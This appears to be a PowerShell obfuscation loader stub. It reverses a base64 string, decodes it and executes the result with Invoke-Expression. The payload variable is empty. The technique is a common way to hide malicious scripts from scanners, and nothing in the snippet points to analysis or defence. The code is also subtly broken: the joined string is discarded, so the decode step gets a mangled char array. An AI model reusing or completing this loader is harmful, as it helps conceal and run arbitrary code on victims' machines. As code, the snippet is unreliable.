$best64code = ""
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
Invoke-Expression $LoadCode
